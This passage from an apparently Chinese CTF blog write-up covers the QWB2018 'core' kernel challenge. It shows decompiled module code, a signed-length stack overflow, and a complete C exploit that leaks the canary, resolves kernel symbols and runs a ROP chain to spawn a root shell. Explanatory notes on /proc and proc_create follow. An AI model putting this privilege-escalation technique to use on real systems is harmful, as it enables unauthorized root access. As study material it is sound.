class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>core_copy_func()</strong> 从全局变量 <code>name</code> 中拷贝数据到局部变量中，长度是由我们指定的，当要注意的是 qmemcpy 用的是 <code>unsigned __int16</code>，但传递的长度是 <code>signed __int64</code>，因此如果控制传入的长度为 <code>0xffffffffffff0000|(0x100)</code> 等值，就可以栈溢出了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">core_copy_func</span><span class="params">(<span class="type">signed</span> __int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(<span class="string">&quot;\x016core: called core_writen&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">63</span> )</span><br><span class="line">    printk(<span class="string">&quot;\x016Detect Overflow&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    qmemcpy(v1, name, (<span class="type">unsigned</span> __int16)a1);    <span class="comment">// overflow</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>core_write()</strong> 向全局变量 <code>name</code> 上写，这样通过 <code>core_write()</code> 和 <code>core_copy_func()</code> 就可以控制 ropchain 了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">signed</span> __int64 __fastcall <span class="title function_">core_write</span><span class="params">(__int64 a1, __int64 a2, <span class="type">unsigned</span> __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  v3 = a3;</span><br><span class="line">  printk(<span class="string">&quot;\x016core: called core_writen&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt;= <span class="number">0x800</span> &amp;&amp; !copy_from_user(name, a2, v3) )</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)v3;</span><br><span class="line">  printk(<span class="string">&quot;\x016core: error copying data from userspacen&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFF2</span>LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br></pre></td><td class="code"><pre><span class="line">QWB2018_core [master●●] cat exploit.c </span><br><span class="line"><span class="comment">// gcc exploit.c -static -masm=intel -g -o exploit</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spawn_shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]spawn shell error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0</span>, prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> raw_vmlinux_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * give_to_player [master●●] check ./core.ko</span></span><br><span class="line"><span class="comment">   ./core.ko: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), BuildID[sha1]=549436d</span></span><br><span class="line"><span class="comment">   [*] &#x27;/home/m4x/pwn_repo/QWB2018_core/give_to_player/core.ko&#x27;</span></span><br><span class="line"><span class="comment">       Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment">       RELRO:    No RELRO</span></span><br><span class="line"><span class="comment">       Stack:    Canary found</span></span><br><span class="line"><span class="comment">       NX:       NX enabled</span></span><br><span class="line"><span class="comment">       PIE:      No PIE (0x0)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">size_t</span> vmlinux_base = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">find_symbols</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    FILE* kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="comment">/* FILE* kallsyms_fd = fopen(&quot;./test_kallsyms&quot;, &quot;r&quot;); */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(kallsyms_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span>(fgets(buf, <span class="number">0x30</span>, kallsyms_fd))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* puts(buf); */</span></span><br><span class="line">            <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="comment">/* printf(&quot;hex: %s\n&quot;, hex); */</span></span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;commit_creds);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>, commit_creds);</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * give_to_player [master●●] bpython</span></span><br><span class="line"><span class="comment">                bpython version 0.17.1 on top of Python 2.7.15 /usr/bin/n</span></span><br><span class="line"><span class="comment">                &gt;&gt;&gt; from pwn import *</span></span><br><span class="line"><span class="comment">                &gt;&gt;&gt; vmlinux = ELF(&quot;./vmlinux&quot;)</span></span><br><span class="line"><span class="comment">                [*] &#x27;/home/m4x/pwn_repo/QWB2018_core/give_to_player/vmli&#x27;</span></span><br><span class="line"><span class="comment">                    Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment">                    RELRO:    No RELRO</span></span><br><span class="line"><span class="comment">                    Stack:    Canary found</span></span><br><span class="line"><span class="comment">                    NX:       NX disabled</span></span><br><span class="line"><span class="comment">                    PIE:      No PIE (0xffffffff81000000)</span></span><br><span class="line"><span class="comment">                    RWX:      Has RWX segments</span></span><br><span class="line"><span class="comment">                &gt;&gt;&gt; hex(vmlinux.sym[&#x27;commit_creds&#x27;] - 0xffffffff81000000)</span></span><br><span class="line"><span class="comment">                &#x27;0x9c8e0&#x27;</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr: %p\n&quot;</span>, vmlinux_base);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* puts(buf); */</span></span><br><span class="line">            <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;prepare_kernel_cred);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">            vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>;</span><br><span class="line">            <span class="comment">/* printf(&quot;vmlinux_base addr: %p\n&quot;, vmlinux_base); */</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(prepare_kernel_cred &amp; commit_creds))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]Error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_off</span><span class="params">(<span class="type">int</span> fd, <span class="type">long</span> <span class="type">long</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]set off to %ld\n&quot;</span>, idx);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889C</span>, idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_read</span><span class="params">(<span class="type">int</span> fd, <span class="type">char</span> *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]read to buf.&quot;</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889B</span>, buf);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_copy_func</span><span class="params">(<span class="type">int</span> fd, <span class="type">long</span> <span class="type">long</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]copy from user with size: %ld\n&quot;</span>, size);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889A</span>, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open /proc/core error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    find_symbols();</span><br><span class="line">    <span class="comment">// gadget = raw_gadget - raw_vmlinux_base + vmlinux_base;</span></span><br><span class="line">    <span class="type">ssize_t</span> offset = vmlinux_base - raw_vmlinux_base;</span><br><span class="line"></span><br><span class="line">    set_off(fd, <span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    core_read(fd, buf);</span><br><span class="line">    <span class="type">size_t</span> canary = ((<span class="type">size_t</span> *)buf)[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]canary: %p\n&quot;</span>, canary);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> rop[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        rop[i] = canary;</span><br><span class="line">    &#125;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81000b2f</span> + offset; <span class="comment">// pop rdi; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = prepare_kernel_cred;         <span class="comment">// prepare_kernel_cred(0)</span></span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff810a0f49</span> + offset; <span class="comment">// pop rdx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81021e53</span> + offset; <span class="comment">// pop rcx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff8101aa6a</span> + offset; <span class="comment">// mov rdi, rax; call rdx; </span></span><br><span class="line">    rop[i++] = commit_creds;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret; </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = (<span class="type">size_t</span>)spawn_shell;         <span class="comment">// rip </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    write(fd, rop, <span class="number">0x800</span>);</span><br><span class="line">    core_copy_func(fd, <span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="延拓1"><a href="#延拓1" class="headerlink" title="延拓1"></a>延拓1</h2><p>在这道例题中可以看到模块在初始化函数中主要是调用proc_create函数</p><p>要了解这个函数首先先了解一下/proc文件系统</p><h3 id="proc"><a href="#proc" class="headerlink" title="/proc"></a>/proc</h3><blockquote><p>在许多类 Unix计算机系统中,<strong>procfs</strong> 是 进程文件系统(process file system) 的缩写,包含一个伪文件系统（启动时动态生成的文件系统），用于通过内核访问进程信息。这个文件系统通常被挂载到 <code>/proc</code> 目录。由于 <code>/proc</code> <strong>不是一个真正的文件系统</strong>，它也就不占用存储空间，只是占用有限的内存。</p></blockquote><p><strong>创建一个 proc 虚拟文件，应用层通过读写该文件，即可实现与内核的交互。</strong></p><p>Linux中每个正在运行的进程对应于<code>/proc</code>下的一个目录，目录名就是进程的PID，每个目录包含:</p><ul><li>/proc/PID/cmdline, 启动该进程的命令行.</li><li>/proc/PID/cwd, 当前工作目录的符号链接</li><li>/proc/PID/environ 影响进程的环境变量的名字和值.</li><li>/proc/PID/exe, 最初的可执行文件的符号链接, 如果它还存在的话。</li><li>/proc/PID/fd, 一个目录，包含每个打开的文件描述符的符号链接.</li><li>/proc/PID/fdinfo, 一个目录，包含每个打开的文件描述符的位置和标记</li><li>/proc/PID/maps, 一个文本文件包含内存映射文件与块的信息。</li><li>/proc/PID/mem, 一个二进制图像(image)表示进程的虚拟内存, 只能通过ptrace化进程访问.</li><li>/proc/PID/root, 该进程所能看到的根路径的符号链接。如果没有chroot监狱，那么进程的根路径是/.</li><li>/proc/PID/status包含了进程的基本信息，包括运行状态、内存使用。</li><li>/proc/PID/task, 一个目录包含了硬链接到该进程启动的任何任务</li></ul><p>用户可以获得PID使用工具如pgrep, pidof或ps:</p><h3 id="伪文件系统"><a href="#伪文件系统" class="headerlink" title="伪文件系统"></a>伪文件系统</h3><p>上面提到的伪文件系统又是什么,和普通文件系统有什么不同</p><ol><li><strong>实现方式</strong>:<ul><li><strong>普通文件系统</strong>：通常是针对块设备（硬盘、分区等）或其他<u>存储介质的实际文件系统</u>，例如 ext4、FAT32、NTFS 等。这些文件系统实现了<u>对物理存储介质的管理</u>，包括文件的组织、存储、检索等操作。</li><li><strong>伪文件系统</strong>：是在内存中实现的，不涉及对物理存储介质的直接访问。它提供了一种访问内核状态和信息的机制，通过<u>在文件系统层次结构中创建伪文件</u>，用户和进程可以通过文件 I/O 接口来访问和修改内核的状态。</li></ul></li><li><strong>目的</strong>:<ul><li><strong>普通文件系统</strong>：主要用于存储和管理用户数据，提供了对数据的持久性存储和检索支持。这些文件系统通常关注于数据的长期保存和管理。</li><li><strong>伪文件系统</strong>：用于提供一种用户空间和内核空间之间的通信机制。通过伪文件系统，用户可以访问内核中的信息，例如系统状态、进程信息、设备信息等。这样的文件系统并非用于长期存储数据，而是用于提供一个接口来查询和配置内核状态。</li></ul></li><li><strong>位置</strong>:<ul><li><strong>普通文件系统</strong>：存储在物理存储介质上，例如硬盘、SSD 等。</li><li><strong>伪文件系统</strong>：存储在内存中，通常在 <code>/proc</code> 和 <code>/sys</code> 目录下，用于让用户和进程通过文件接口与内核进行通信。</li></ul></li></ol><p>经典的伪文件系统包括 <code>/proc</code> 和 <code>/sys</code>：</p><ul><li><code>/proc</code> 提供了对系统和进程信息的访问，例如 <code>/proc/cpuinfo</code> 可以查看 CPU 信息，<code>/proc/meminfo</code> 可以查看内存信息。</li><li><code>/sys</code> 则提供了对内核和设备参数的访问，例如 <code>/sys/class/gpio</code> 可以用于控制 GPIO。</li></ul><p>特别的伪文件系统只存在于内存中,不存在于硬盘中</p><h3 id="proc-create"><a href="#proc-create" class="headerlink" title="proc_create"></a>proc_create</h3><p>例题中使用了proc_create函数和remove_proc_entry</p><p>着重研究一下前者,毕竟后者想来是前者的逆操作</p><p>源码在内核<code>/fs/proc/generic.c</code>中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> proc_dir_entry *<span class="title function_">proc_create</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *name, <span class="type">umode_t</span> mode,</span></span><br><span class="line"><span class="params">   <span class="keyword">struct</span> proc_dir_entry *parent,</span></span><br><span class="line"><span class="params">   <span class="type">const</span> <span class="keyword">struct</span> proc_ops *proc_ops)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> proc_create_data(name, mode, parent, proc_ops, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(proc_create);</span><br></pre></td></tr></table></figure><p>四个参数分别是</p><ol><li><code>name</code>,要创建的文件夹的名字</li><li><code>mode</code>,创建的文件夹的权限模式,<u>八进制</u>下的UGO模式</li><li><code>parent</code>,要创建节点的父节点,也就是要在哪个文件夹之下创建新文件夹，需要将那个文件夹的 proc_dir_entry 传入。如果直接在/proc/目录下则不需要</li><li><code>proc_ops</code>该文件的操作函数</li></ol><hr><p>其中还涉及到两个结构体proc_dir_entry和proc_ops</p><p>proc_ops是一个用于存放要注册的函数指针的结构体,之后对打开的设备文件调用对应函数便会指向这些函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc_ops</span> &#123;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> proc_flags;</span><br><span class="line"><span class="type">int</span>(*proc_open)(<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *);</span><br><span class="line"><span class="type">ssize_t</span>(*proc_read)(<span class="keyword">struct</span> file *, <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span> *);</span><br><span class="line"><span class="type">ssize_t</span> (*proc_read_iter)(<span class="keyword">struct</span> kiocb *, <span class="keyword">struct</span> iov_iter *);</span><br><span class="line"><span class="type">ssize_t</span>(*proc_write)(<span class="keyword">struct</span> file *, <span class="type">const</span> <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span> *);</span><br><span class="line"><span class="comment">/* mandatory unless nonseekable_open() or equivalent is used */</span></span><br><span class="line"><span class="type">loff_t</span>(*proc_lseek)(<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="type">int</span>);</span><br><span class="line"><span class="type">int</span>(*proc_release)(<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *);</span><br><span class="line"><span class="type">__poll_t</span> (*proc_poll)(<span class="keyword">struct</span> file *, <span class="keyword">struct</span> poll_table_struct *);</span><br><span class="line"><span class="type">long</span>(*proc_ioctl)(<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">unsigned</span> <span class="type">long</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPAT</span></span><br><span class="line"><span class="type">long</span>(*proc_compat_ioctl)(<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">unsigned</span> <span class="type">long</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">int</span>(*proc_mmap)(<span class="keyword">struct</span> file *, <span class="keyword">struct</span> vm_area_struct *);</span><br><span class="line"><span class="type">unsigned</span> <span class="title function_">long</span> <span class="params">(*proc_get_unmapped_area)</span><span class="params">(<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>)</span>;</span><br><span class="line">&#125; __randomize_layout;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>proc_dir_entry则是proc文件系统下目录的存储结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc_dir_entry</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * number of callers into module in progress;</span></span><br><span class="line"><span class="comment"> * negative -&gt; it&#x27;s going away RSN</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">atomic_t</span> in_use;</span><br><span class="line"><span class="type">refcount_t</span> 